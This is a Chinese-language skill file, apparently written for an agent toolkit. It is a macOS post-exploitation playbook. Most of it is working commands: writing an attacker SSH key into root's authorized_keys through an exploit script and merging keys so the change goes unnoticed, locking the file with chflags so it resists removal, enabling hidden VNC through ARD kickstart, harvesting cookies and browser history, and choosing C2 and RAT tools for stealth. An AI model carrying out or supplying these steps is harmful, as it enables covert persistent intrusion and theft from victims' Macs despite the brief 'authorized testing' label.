---
name: 白凝冰·后手
description: >-
  大爱仙尊·macOS 后渗透手册。SSH 公钥后门、ARD VNC 实时控制、远控选型。应对 macOS 授权测试后渗透。
---

> **白凝冰**
> 万丈红尘缤纷彩，天涯云水路遥长。
> 此刻风流归天地，不胜水中明月光。

# macos-post-exploitation（大爱仙尊）

目标须在 `授权范围`。本库已有专链时专卡赢。

## 真源

- 长文：`智道藏书/旁支传承/skills/redteam/macos-post-exploitation/SKILL.md`
- 手法：`传承/逆骨·认族.md`
- 工具：`python3 炼蛊房/reverse_skill_route.py --help`
- 路由：`python3 炼蛊房/shizhan_pack_route.py --name macos-post-exploitation`

---

# macOS 后渗透与远程控制

> 授权测试场景。拿到 macOS root（如 CVE-2026-65400 预认证绕过）后的完整控制链。

## 核心原则
- **顺序**：先读后写（防覆盖原文件）→ 先 SSH 后 VNC → 用完即关 VNC
- **优先级**：系统自带 > 第三方；临时 > 常驻；命令行 > 图形
- VNC 是临时工具，SSH 是永久后门——能 SSH 就 SSH，VNC 仅需图形界面时开

## ① SSH 公钥后门（最隐蔽、最推荐）
```bash
# 攻击机生成密钥
ssh-keygen -t ed25519 -f ~/.ssh/mac_key -N "" -C ""

# ⚠️ 关键坑：写 authorized_keys 是整文件覆盖，不是追加！
# 必须先读原文件合并，否则覆盖原 key 立刻暴露
# 1) 读原文件
python3 exploit.py <ip> /var/root/.ssh/authorized_keys -o orig_authorized_keys
# 2) 合并（原key + 新key，一行一个）
cat orig_authorized_keys ~/.ssh/mac_key.pub > merged_authorized_keys
# 3) 写回（mode 必须 0600）
python3 exploit.py <ip> -w merged_authorized_keys -m 0600 /var/root/.ssh/authorized_keys
# 4) 验证 sha256 一致
sha256sum merged_authorized_keys check.txt
# 5) 登录
ssh -i ~/.ssh/mac_key root@<ip>
```

**防清理加固**：
```bash
# chflags 加锁（root 也删不掉，需先 chflags nouchg 解锁）
chflags uchg /var/root/.ssh/authorized_keys
# 双后门：另一用户路径也放一份 key
# 检查 PermitRootLogin /etc/ssh/sshd_config
```

**用户枚举**：读 `/Library/Preferences/com.apple.loginwindow.plist` 拿登录用户名 → 读 `/Users/<user>/.ssh/`、Safari 历史、浏览器 Cookie（root + TCC 绕过，全用户目录可读）。

## ② ARD kickstart 开 VNC（实时桌面控制，系统自带零落地）
```bash
# 开启（root）
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
  -activate -configure -access on \
  -clientopts -setvnclegacy -vnclegacy yes \
  -setvncpw -vncpw '密码' \
  -restart -agent -console

# 查状态（应见 Remote Management: Running / Screen Sharing: Running）
/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -status

# 关闭（用完立刻执行，痕迹最小化）
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop
```
- 攻击机连接：TigerVNC `vncviewer <ip>:5900` / macOS 屏幕共享 `vnc://<ip>:5900`
- 连上后防黑屏断连：`sudo pmset -a sleep 0; sudo caffeinate -d`
- 不触发屏幕录制 TCC 弹窗（系统级服务）；日志在 /var/log/ardagent.log

## ③ 远控选型对比（Mac 实时屏幕控制）
| 工具 | 实时桌面 | 说明 |
|---|---|---|
| C2 框架（Sliver/CS/Havoc/Mythic） | ❌ 默认无 | shell/文件/截屏(静态)，无实时画面 |
| Pupy | ⚠️ 静态截图 | `run screenshot`/`webcamsnap`/`keylogger`(darwin)，无实时控制 |
| Merlin | ❌ 无 | 无 screenshot/VNC 模块（源码查证） |
| SilentMoonwalk | ❌ 不是RAT | 是 Windows 栈欺骗 PoC，无控制功能 |
| 原生 VNC/ARD | ✅ | 系统自带、零落地、最隐蔽 |
| 商业远控（ToDesk/向日葵/AnyDesk） | ✅ | 实时最好但特征明显、设备指纹、被举报锁定 |

结论：开源 C2/RAT 普遍"能看静态画面，不能实时控制"。真·实时 = C2 shell + 原生 VNC 组合。

## ④ 完整组合拳
```
1. 打进去（如 CVE-2026-65400 认证绕过 → root）
2. 写 SSH 公钥 → 验证 SSH 通路（隐蔽后门）
3. ARD kickstart 开 VNC（临时图形控制）
4. VNC 实时控制干正事
5. 干完 kickstart -deactivate 关闭
6. SSH 后门留着（chflags uchg 锁定 + 双路径）
```

## 陷阱速记
- write 是覆盖不是追加 → 必须先 read 合并
- 漏洞 racy → 重试 25 次失败等 1 分钟
- VNC 用完必须关，日志 /var/log/ardagent.log
- SIP 开启不影响 /Library/LaunchDaemons、用户目录、.ssh 可写
- 参考：references/cve-2026-65400-macos-screensharing.md（Screen Sharing 预认证绕过完整利用链）
